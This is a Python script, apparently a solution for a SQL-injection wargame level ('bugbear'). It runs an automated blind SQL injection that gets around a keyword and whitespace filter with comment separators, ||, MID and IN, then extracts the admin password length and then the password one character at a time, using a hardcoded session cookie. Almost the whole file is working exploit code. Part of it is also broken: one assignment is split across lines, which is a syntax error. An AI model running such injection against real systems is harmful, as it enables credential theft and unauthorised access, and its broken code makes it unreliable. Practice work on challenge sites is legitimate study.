'''
filter = '(single quote), substr, ascii, =, or, and, whitespace, like, 0x
'''

import urllib.request
from urllib.parse import quote  # url encoding func

url = 'http://los.rubiya.kr/bugbear_19ebf8c8106a5323825b5dfa1b07ac1f.php?no='
result = ""
pwlen = 0

__author__ = "goodasd123@naver.com - h4lo"


def req(query):
    re = urllib.request.Request(query)
    re.add_header('User-Agent', 'Mozilla/5.0')
    re.add_header('Cookie', 'PHPSESSID=pv3b5c4bkmaeopgdr693b2t6j2')
    res = urllib.request.urlopen(re)
    return res

for i in range(0, 10):
    add_url = '-1/**/||/**/length(pw)/**/IN("{}")--'.format(i)
    query = url + quote(add_url)

    if str(req(query).read()).find('Hello admin') != -1:
        pwlen = i
        print("[Password length is {}!]".format(pwlen))
        break
    else:
        print("Matching.. -> [{}]".format(i))

for i in range(1, pwlen + 1):
    for j in range(ord('0'), (ord('z') + 1)):
        add_url =
        '-1/**/||/**/MID(pw,1,{})/**/IN("{}")--'.format(i, result + chr(j))
        query = url + quote(add_url)

        if str(req(query).read()).find('Hello admin') != -1:
            result += chr(j).lower()
            print("[Find!! - {} // {}]".format(chr(j), result))
            break
        else:
            print("Matching.. -> [{}]".format(chr(j)))

print("Blind SQL Injection completed.")
print("Password is {}".format(result))
